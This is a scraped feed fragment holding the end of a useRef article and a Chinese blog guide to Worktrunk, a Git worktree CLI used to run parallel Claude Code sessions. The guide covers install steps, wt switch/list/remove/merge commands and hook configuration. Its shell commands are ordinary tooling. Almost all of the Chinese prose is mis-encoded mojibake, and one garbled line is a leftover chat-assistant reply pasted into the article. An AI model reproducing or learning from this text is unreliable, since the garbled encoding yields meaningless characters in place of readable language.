<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œå½“ä½ é‡åˆ°ä»¥ä¸‹æƒ…å†µæ—¶ï¼Œä¸å¦¨æƒ³æƒ³ <code>useRef</code>ï¼š</p>
<ul>
<li>â€œæˆ‘éœ€è¦åœ¨ç»„ä»¶é‡Œä¿å­˜ä¸€ä¸ªå€¼ï¼Œä½†å®ƒå˜äº†ä¸éœ€è¦åˆ·æ–°é¡µé¢ã€‚â€</li>
<li>â€œæˆ‘æƒ³åœ¨æŒ‚è½½åæ“ä½œæŸä¸ª DOM å…ƒç´ ã€‚â€</li>
<li>â€œæˆ‘çš„å®šæ—¶å™¨æ€ä¹ˆå…³ä¸æ‰äº†ï¼Ÿæ˜¯ä¸æ˜¯ ID ä¸¢äº†ï¼Ÿâ€</li>
</ul>
<p>ç­”æ¡ˆï¼Œå¾€å¾€å°±åœ¨ <code>useRef</code> ä¹‹ä¸­ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Worktrunk å®Œå…¨æŒ‡å—ï¼šè®© Git Worktree å’Œ Claude Code å’Œå¹³å…±å¤„]]></title>    <link>https://juejin.cn/post/7589828815939633206</link>    <guid>https://juejin.cn/post/7589828815939633206</guid>    <pubDate>2025-12-31T12:27:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589828815939633206" data-draft-id="7589838714449887273" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Worktrunk å®Œå…¨æŒ‡å—ï¼šè®© Git Worktree å’Œ Claude Code å’Œå¹³å…±å¤„"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹,Claude"/> <meta itemprop="datePublished" content="2025-12-31T12:27:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="cos"/> <meta itemprop="url" content="https://juejin.cn/user/1698115646132254"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Worktrunk å®Œå…¨æŒ‡å—ï¼šè®© Git Worktree å’Œ Claude Code å’Œå¹³å…±å¤„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1698115646132254/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    cos
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T12:27:31.000Z" title="Wed Dec 31 2025 12:27:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cosine.ren%2Fpost%2Fgit-worktrunk-guide" target="_blank" title="https://blog.cosine.ren/post/git-worktrunk-guide" ref="nofollow noopener noreferrer">blog.cosine.ren/post/git-woâ€¦</a></p>
</blockquote>
<h2 data-id="heading-0">å†™åœ¨å‰é¢</h2>
<p>æœ€è¿‘ç”¨ Claude Code å†™ä»£ç çš„é¢‘ç‡è¶Šæ¥è¶Šé«˜ï¼Œæœ‰æ—¶å€™ä¼šåŒæ—¶å¼€ä¸‰å››ä¸ªä»»åŠ¡ï¼šä¸€ä¸ªåœ¨ä¿® bugï¼Œä¸€ä¸ªåœ¨åŠ æ–°åŠŸèƒ½ï¼Œä¸€ä¸ªåœ¨ review ä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªåœ¨è·‘æµ‹è¯•éªŒè¯æ–°ç‚¹å­ã€‚é—®é¢˜æ¥äº†ï¼šå®ƒä»¬éƒ½éœ€è¦ç‹¬ç«‹çš„å·¥ä½œç›®å½•ï¼Œä¸ç„¶ä¼šäº’ç›¸ä¸²ä»£ç ã€‚</p>
<p>Git çš„ <code>worktree</code> åŠŸèƒ½æœ¬æ¥å°±æ˜¯ä¸ºè¿™ç§åœºæ™¯è®¾è®¡çš„ï¼Œä½†åŸç”Ÿå‘½ä»¤å®åœ¨æœ‰äº›å•°å—¦ã€‚ä¼ ç»Ÿåˆ›å»ºä¸€ä¸ªæ–° worktree è¦è¿™æ ·ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">git worktree add -b feature-auth ../myproject-feature-auth
<span class="hljs-built_in">cd</span> ../myproject-feature-auth
</code></pre>
<p>åˆ æ‰å®ƒåˆå¾—å›åˆ°ä¸»ç›®å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> ../myproject
git worktree remove ../myproject-feature-auth
git branch -d feature-auth
</code></pre>
<p>åˆ†æ”¯åè¦è¾“ä¸‰æ¬¡ï¼Œæ¯æ¬¡éƒ½è¦æ‰‹åŠ¨ <code>cd</code>ã€‚å¹²è¿™äº‹å„¿å¤šäº†ï¼Œä¼šè§‰å¾—æœ‰äº›æµªè´¹ç”Ÿå‘½ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä¹‹å‰ä¸ºä»€ä¹ˆä¸å–œæ¬¢ worktreeã€‚</p>
<p>ç›´åˆ°å‘ç° <a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2F" target="_blank" title="https://worktrunk.dev/" ref="nofollow noopener noreferrer">Worktrunk</a>ï¼Œæ‰å‘ç° worktree ç®¡ç†åŸæ¥å¯ä»¥è¿™ä¹ˆä¼˜é›…ï¼ˆå½“ç„¶è¿˜æœ‰å¾ˆå¤šåˆ«çš„å·¥å…·ï¼‰ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmax_sixty%2Fstatus%2F2006077845391724739" target="_blank" title="https://x.com/max_sixty/status/2006077845391724739" ref="nofollow noopener noreferrer">x.com/max_sixty/sâ€¦</a></p>
<p>ç”¨ä¸‹æ¥æ„Ÿè§‰éå¸¸å¥½ï¼Œå†™ä¸€ç¯‡åšå®¢å–ä¸€å–å®‰åˆ©ã€‚</p>
<h2 data-id="heading-1">Worktrunk æ˜¯ä»€ä¹ˆ</h2>
<p>ç®€å•æ¥è¯´ï¼ŒWorktrunk æ˜¯ä¸€ä¸ª <strong>Git Worktree çš„ CLI åŒ…è£…å·¥å…·</strong>ï¼Œä¸“é—¨ä¸º<strong>å¹¶è¡Œè¿è¡Œå¤šä¸ª AI Agent</strong> çš„åœºæ™¯ä¼˜åŒ–ã€‚å®ƒçš„æ ¸å¿ƒç†å¿µæ˜¯ï¼š</p>
<blockquote>
<p><strong>æ¯ä¸ª worktree å¯¹åº”ä¸€ä¸ªåˆ†æ”¯ï¼Œç”¨åˆ†æ”¯åç®¡ç† worktreeï¼Œè·¯å¾„è‡ªåŠ¨ç”Ÿæˆã€‚</strong></p>
</blockquote>
<p>å¯¹æ¯”ä¸€ä¸‹å‘½ä»¤å·®å¼‚å°±èƒ½æ„Ÿå—åˆ°å·®å¼‚ï¼š</p>






























<table><thead><tr><th>ä»»åŠ¡</th><th>Worktrunk</th><th>åŸç”Ÿ Git</th></tr></thead><tbody><tr><td>åˆ‡æ¢åˆ°æŸä¸ª worktree</td><td><code>wt switch feat</code></td><td><code>cd ../repo.feat</code></td></tr><tr><td>åˆ›å»º worktree + å¯åŠ¨ Claude</td><td><code>wt switch -c -x claude feat</code></td><td><code>git worktree add -b feat ../repo.feat &amp;&amp; cd ../repo.feat &amp;&amp; claude</code></td></tr><tr><td>æ¸…ç†å½“å‰ worktree</td><td><code>wt remove</code></td><td><code>cd ../repo &amp;&amp; git worktree remove ../repo.feat &amp;&amp; git branch -d feat</code></td></tr><tr><td>åˆ—å‡ºæ‰€æœ‰ worktree çŠ¶æ€</td><td><code>wt list</code></td><td><code>git worktree list</code> (åªæ˜¾ç¤ºè·¯å¾„)</td></tr></tbody></table>
<p>åŸºæœ¬å°±æ˜¯æŠŠ <code>git worktree</code> çš„æ“ä½œå¤æ‚åº¦ä»ã€Œè®°ä¸‰ä¸ªå‚æ•°ã€é™åˆ°ã€Œè¯´ä¸ªåˆ†æ”¯åã€ã€‚</p>
<h2 data-id="heading-2">ä¸ºä»€ä¹ˆéœ€è¦ Worktrunk?</h2>
<p>å¦‚æœä½ åªæ˜¯å¶å°”ç”¨ä¸€ä¸‹ worktreeï¼ŒåŸç”Ÿå‘½ä»¤å½“ç„¶å°±è¡Œäº†ã€‚ä½†å½“ä½ éœ€è¦<strong>é¢‘ç¹å¹¶è¡Œå¼€å‘</strong>ï¼ˆæ¯”å¦‚åŒæ—¶è·‘å¤šä¸ª AI Agentï¼‰æˆ–è€…<strong>éœ€è¦è‡ªåŠ¨åŒ–æµç¨‹</strong>ï¼ˆåˆ›å»º worktree åè‡ªåŠ¨è£…ä¾èµ–ã€è·‘æµ‹è¯•ï¼‰çš„æ—¶å€™ï¼ŒWorktrunk èƒ½çœä¸‹ä¸å°‘æ—¶é—´å’Œå¿ƒæ™ºè´Ÿæ‹…ã€‚å®ƒæœ¬è´¨ä¸Šæ˜¯æŠŠã€Œç”¨ worktree çš„æ­£ç¡®å§¿åŠ¿ã€å›ºåŒ–æˆäº†å·¥å…·ã€‚</p>
<h2 data-id="heading-3">å®‰è£…ä¸é…ç½®</h2>
<h3 data-id="heading-4">å®‰è£…</h3>
<p><strong>macOS/Linux (æ¨è Homebrew)ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">brew install max-sixty/worktrunk/wt
</code></pre>
<p><strong>æˆ–è€…ç”¨ Cargoï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">cargo install worktrunk
</code></pre>
<h3 data-id="heading-5">Shell é›†æˆ</h3>
<p>è£…å®Œä¹‹å<strong>å¿…é¡»è·‘è¿™ä¸€æ­¥</strong>ï¼Œå¦åˆ™ <code>wt switch</code> æ— æ³•åˆ‡æ¢ç›®å½•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">wt config shell install
</code></pre>
<p>å®ƒä¼šåœ¨ä½ çš„ <code>.zshrc</code> æˆ– <code>.bashrc</code> é‡ŒåŠ ä¸€æ®µå‡½æ•°ï¼Œè®© <code>wt</code> å‘½ä»¤å¯ä»¥æ”¹å˜å½“å‰ shell çš„å·¥ä½œç›®å½•ã€‚</p>
<p>è£…å®Œé‡å¯ç»ˆç«¯ï¼Œè·‘ <code>wt --version</code> ç¡®è®¤å®‰è£…æˆåŠŸã€‚</p>
<h2 data-id="heading-6">æ ¸å¿ƒå‘½ä»¤è¯¦è§£</h2>
<h3 data-id="heading-7"><code>wt switch</code> - åˆ‡æ¢/åˆ›å»º Worktree</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fswitch%2F" target="_blank" title="https://worktrunk.dev/switch/" ref="nofollow noopener noreferrer">wt switch | Worktrunk</a></p>
<p>è¿™æ˜¯æœ€å¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨æ³•æç®€ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ‡æ¢åˆ°å·²å­˜åœ¨çš„ worktree (åˆ†æ”¯å feat)</span>
wt switch feat

<span class="hljs-comment"># åŸºäºä¸»åˆ†æ”¯ main åˆ›å»ºæ–° worktree + åˆ†æ”¯ feat</span>
wt switch -c feat

<span class="hljs-comment"># åˆ›å»º worktree + è‡ªåŠ¨å¯åŠ¨ Claude Code</span>
wt switch -c feat -x claude

<span class="hljs-comment"># åŸºäº dev åˆ†æ”¯åˆ›å»ºæ–° worktree + åˆ†æ”¯ feat-new (è€Œä¸æ˜¯ main) + è‡ªåŠ¨å¯åŠ¨ claude</span>
wt switch -c feat-new -b dev -x claude
</code></pre>
<p><strong>è·¯å¾„è§„åˆ™</strong>ï¼š Worktrunk ä¼šè‡ªåŠ¨åœ¨ä¸»ä»“åº“çš„<strong>åŒçº§ç›®å½•</strong>ä¸‹åˆ›å»º worktreeï¼Œå‘½åæ ¼å¼æ˜¯ <code>&lt;repo&gt;.&lt;branch&gt;</code>ã€‚æ¯”å¦‚ä¸»ä»“åº“åœ¨ <code>~/code/myproject</code>ï¼Œåˆ†æ”¯ <code>feat</code> çš„ worktree å°±åœ¨ <code>~/code/myproject.feat</code>ã€‚</p>
<p><strong>å‚æ•°è¯´æ˜</strong>ï¼š</p>
<ul>
<li><code>-c</code> / <code>--create</code>ï¼šåˆ›å»ºæ–° worktree + åˆ†æ”¯</li>
<li><code>-x &lt;cmd&gt;</code>ï¼šåˆ‡æ¢åè‡ªåŠ¨æ‰§è¡Œå‘½ä»¤ (æ¯”å¦‚ <code>claude</code>, <code>code</code>, <code>npm install</code>)</li>
<li><code>-b &lt;base&gt;</code>ï¼šæŒ‡å®šåŸºç¡€åˆ†æ”¯ (é»˜è®¤æ˜¯ <code>main</code>)</li>
</ul>

























<table><thead><tr><th>Shortcut</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><code>^</code></td><td>é»˜è®¤åˆ†æ”¯ï¼ˆmain/masterï¼‰</td></tr><tr><td><code>@</code></td><td>å½“å‰åˆ†æ”¯/å·¥ä½œæ ‘</td></tr><tr><td><code>-</code></td><td>ä¹‹å‰çš„å·¥ä½œç›®å½•ï¼ˆä¾‹å¦‚ <code>cd -</code> ï¼‰</td></tr><tr><td/><td/></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash">wt switch -                      <span class="hljs-comment"># Back to previous</span>
wt switch ^                      <span class="hljs-comment"># Default branch worktree</span>
wt switch --create fix --base=@  <span class="hljs-comment"># Branch from current HEAD</span>
</code></pre>
<h4 data-id="heading-8">å®æˆ˜åœºæ™¯</h4>
<p>å‡è®¾ä½ åœ¨è·‘ä¸‰ä¸ªå¹¶è¡Œä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Terminal 1: ä¿®å¤è®¤è¯ bug</span>
wt switch -c -x claude fix-auth

<span class="hljs-comment"># Terminal 2: é‡æ„ API</span>
wt switch -c -x claude refactor-api

<span class="hljs-comment"># Terminal 3: åŠ æ–°åŠŸèƒ½</span>
wt switch -c -x claude feat-dashboard
</code></pre>
<p>æ¯ä¸ª Claude å®ä¾‹è·‘åœ¨ç‹¬ç«‹ç›®å½•é‡Œï¼Œäº’ä¸å¹²æ‰°ã€‚</p>
<h3 data-id="heading-9"><code>wt list</code> - æŸ¥çœ‹æ‰€æœ‰ Worktree</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Flist%2F" target="_blank" title="https://worktrunk.dev/list/" ref="nofollow noopener noreferrer">wt list | Worktrunk</a></p>
<pre><code class="hljs language-bash" lang="bash">wt list
</code></pre>
<p>è¾“å‡ºå¤§æ¦‚é•¿è¿™æ ·:</p>
<pre><code class="hljs language-bash" lang="bash">wt list
  Branch       Status        HEADÂ±    mainâ†•  Remoteâ‡…  Commit    Age   Message
@ feature-api  +   â†•â‡¡     +54   -5   â†‘4  â†“1   â‡¡3      ec97decc  30m   Add API tests
^ main             ^â‡…                         â‡¡1  â‡£1  6088adb3  4d    Merge fix-auth: hardened toâ€¦
+ fix-auth         â†•|                â†‘2  â†“1     |     127407de  5h    Add secure token storage

â—‹ Showing 3 worktrees, 1 with changes, 2 ahead, 1 column hidden
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7338c58af7841be90ac2fdbd1eaae97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767788851&amp;x-signature=5bLsTOb8NbUHYlJe57%2BIwRewF4k%3D" alt="" loading="lazy"/></p>
<p>æ¯”åŸç”Ÿ <code>git worktree list</code> å¼ºå¾ˆå¤šï¼Œå¯ä»¥çœ‹åˆ°å¾ˆå¤šä¿¡æ¯</p>
<ul>
<li><strong>Git çŠ¶æ€</strong>ï¼šæœ‰å¤šå°‘æœªæäº¤/æœªè¿½è¸ªæ–‡ä»¶</li>
<li><strong>CI çŠ¶æ€</strong>ï¼šå¦‚æœé…ç½®äº† GitHub Actions,ä¼šæ˜¾ç¤ºæœ€æ–°çš„æ„å»ºçŠ¶æ€</li>
</ul>
<p>å¯¹äºç®¡ç†å¤šä¸ª worktree æ¥è¯´,è¿™ä¸ªè§†å›¾éå¸¸å®ç”¨ã€‚</p>
<h3 data-id="heading-10"><code>wt remove</code> - æ¸…ç† Worktree</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fremove%2F" target="_blank" title="https://worktrunk.dev/remove/" ref="nofollow noopener noreferrer">wt remove | Worktrunk</a></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ é™¤å½“å‰ worktree + åˆ†æ”¯</span>
wt remove

<span class="hljs-comment"># åˆ é™¤æŒ‡å®š worktree</span>
wt remove feature-branch
wt remove old-feature another-branch

<span class="hljs-comment"># åˆ é™¤ worktree ä½†ä¿ç•™åˆ†æ”¯</span>
wt remove --no-delete-branch feature-branch

<span class="hljs-comment"># å¼ºåˆ¶åˆ é™¤æœªåˆå¹¶çš„åˆ†æ”¯</span>
wt remove -D experimental
</code></pre>
<h3 data-id="heading-11"><code>wt merge</code> - åˆå¹¶å·¥ä½œæµ</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fmerge%2F" target="_blank" title="https://worktrunk.dev/merge/" ref="nofollow noopener noreferrer">wt merge | Worktrunk</a></p>
<p>è¿™ä¸ªå‘½ä»¤å°è£…äº†ã€Œåˆå¹¶ â†’ æ¸…ç†ã€çš„å®Œæ•´æµç¨‹ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŠŠå½“å‰ worktree åˆå¹¶åˆ°é»˜è®¤åˆ†æ”¯ å¦‚ main</span>
wt merge
<span class="hljs-comment"># æŠŠå½“å‰ worktree åˆå¹¶åˆ° dev åˆ†æ”¯</span>
wt merge dev
<span class="hljs-comment"># åˆå¹¶åä¿ç•™å·¥ä½œæ ‘</span>
wt merge --no-remove
<span class="hljs-comment"># ä¿ç•™æäº¤å†å²ï¼ˆä¸åˆå¹¶ï¼‰</span>
wt merge --no-squash
<span class="hljs-comment"># è·³è¿‡æäº¤/åˆå¹¶ï¼ˆé™¤éä½¿ç”¨ --no-rebase å‚æ•°ï¼Œå¦åˆ™ rebase ä»ä¼šè¿è¡Œï¼‰</span>
wt merge --no-commit
</code></pre>
<p>å¦‚æœé…ç½®äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fhook%2F" target="_blank" title="https://worktrunk.dev/hook/" ref="nofollow noopener noreferrer"><strong>pre-merge hook</strong></a>ï¼Œä¼šåœ¨åˆå¹¶å‰è‡ªåŠ¨è·‘æµ‹è¯•æˆ– lintã€‚</p>
<h3 data-id="heading-12"><code>wt select</code> - äº¤äº’å¼é€‰æ‹©å™¨</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fselect%2F" target="_blank" title="https://worktrunk.dev/select/" ref="nofollow noopener noreferrer">wt select | Worktrunk</a></p>
<p>å¦‚æœä½ è®°ä¸æ¸… worktree åå­—,å¯ä»¥ç”¨ <code>select</code> å‘½ä»¤:</p>
<pre><code class="hljs language-bash" lang="bash">wt select
</code></pre>
<p>ä¼šå¼¹å‡ºä¸€ä¸ª fzf é£æ ¼çš„ç•Œé¢,ç”¨æ–¹å‘é”®é€‰æ‹©è¦åˆ‡æ¢çš„ worktreeã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db7db9a9a114ac6ac6a4697197ee3ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767788851&amp;x-signature=b1KFa4lgCDpAeGIx0biuEE%2FOsrU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-13">Hooks</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fworktrunk.dev%2Fhook%2F" target="_blank" title="https://worktrunk.dev/hook/" ref="nofollow noopener noreferrer">wt hook | Worktrunk</a></p>
<p>Worktrunk æ”¯æŒåœ¨ worktree ç”Ÿå‘½å‘¨æœŸçš„ä¸åŒé˜¶æ®µæ‰§è¡Œå‘½ä»¤ï¼ŒåŒæ—¶æ”¯æŒå…¨å±€ç”¨æˆ· hook é…ç½®ï¼ˆ<code>~/.config/worktrunk/config.toml</code>Â ï¼‰å’Œé¡¹ç›® hook é…ç½®ï¼ˆÂ <code>.config/wt.toml</code>ï¼‰
å¥½çš„,æˆ‘åªç»™ä½ è¡¥å…… Hook ç³»ç»Ÿè¿™ä¸€æ®µå†…å®¹:</p>
<h3 data-id="heading-14">Hook ç±»å‹ä¸€è§ˆ</h3>





















































<table><thead><tr><th>Hook</th><th>è§¦å‘æ—¶æœº</th><th>é˜»å¡æ¨¡å¼</th><th>å¤±è´¥å³åœ</th></tr></thead><tbody><tr><td><code>post-create</code></td><td>worktree åˆ›å»ºå</td><td>æ˜¯</td><td>å¦</td></tr><tr><td><code>post-start</code></td><td>worktree åˆ›å»ºå</td><td>å¦(åå°)</td><td>å¦</td></tr><tr><td><code>post-switch</code></td><td>æ¯æ¬¡åˆ‡æ¢å</td><td>å¦(åå°)</td><td>å¦</td></tr><tr><td><code>pre-commit</code></td><td>merge æ—¶æäº¤å‰</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td><code>pre-merge</code></td><td>åˆå¹¶åˆ°ç›®æ ‡åˆ†æ”¯å‰</td><td>æ˜¯</td><td>æ˜¯</td></tr><tr><td><code>post-merge</code></td><td>åˆå¹¶æˆåŠŸå</td><td>æ˜¯</td><td>å¦</td></tr><tr><td><code>pre-remove</code></td><td>worktree åˆ é™¤å‰</td><td>æ˜¯</td><td>æ˜¯</td></tr></tbody></table>
<p><strong>é˜»å¡æ¨¡å¼</strong>: å‘½ä»¤æ‰§è¡Œå®Œæˆå‰,ä¸»æµç¨‹ä¼šç­‰å¾…<br/>
<strong>å¤±è´¥å³åœ</strong>: ç¬¬ä¸€ä¸ªå¤±è´¥çš„å‘½ä»¤ä¼šä¸­æ­¢æ•´ä¸ªæ“ä½œ</p>
<h3 data-id="heading-15">æ ¸å¿ƒ Hooks è¯´æ˜</h3>
<p><strong>post-create</strong> - worktree åˆ›å»ºåç«‹å³æ‰§è¡Œ,ä¼šé˜»å¡ç›´åˆ°å®Œæˆ:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[post-create]</span>
<span class="hljs-attr">install</span> = <span class="hljs-string">"npm ci"</span>                    <span class="hljs-comment"># å®‰è£…ä¾èµ–</span>
<span class="hljs-attr">migrate</span> = <span class="hljs-string">"npm run db:migrate"</span>        <span class="hljs-comment"># æ•°æ®åº“è¿ç§»</span>
<span class="hljs-attr">env</span> = <span class="hljs-string">"cp .env.example .env"</span>          <span class="hljs-comment"># å¤åˆ¶ç¯å¢ƒé…ç½®</span>
</code></pre>
<p><strong>post-start</strong> - worktree åˆ›å»ºååœ¨åå°æ‰§è¡Œ,ä¸é˜»å¡åˆ‡æ¢:</p>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[post-start]</span>
<span class="hljs-attr">build</span> = <span class="hljs-string">"npm run build"</span>               <span class="hljs-comment"># æ„å»ºé¡¹ç›®</span>
<span class="hljs-attr">server</span> = <span class="hljs-string">"npm run dev"</span>                <span class="hljs-comment"># å¯åŠ¨å¼€å‘æœåŠ¡å™¨</span>
</code></pre>
<p>æ—¥å¿—è¾“å‡ºåˆ° <code>.git/wt-logs/{branch}-{source}-post-start-{name}.log</code></p>
